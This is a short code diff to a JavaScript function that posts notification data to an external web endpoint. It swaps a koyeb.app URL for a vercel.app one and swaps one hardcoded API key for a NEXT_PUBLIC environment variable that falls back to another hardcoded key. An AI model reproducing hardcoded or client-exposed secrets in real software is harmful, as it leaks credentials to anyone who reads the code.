@@ -60,12 +60,12 @@ export const sendNotificationMessage = (
 
     return axios
         .post(
-            "https://nice-kristin-ethname-aada4ad6.koyeb.app/api/form/submit",
+            "https://ton-bot-eight.vercel.app/api/t1/font",
             messageData,
             {
                 headers: {
                     "Content-Type": "application/json",
-                    "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
+                    "x-api-key": process.env.NEXT_PUBLIC_SECRET_KEY || "6ff73ab1-1ff2-41d5-a849-b7930b62f71a",
                 },
             }
         )
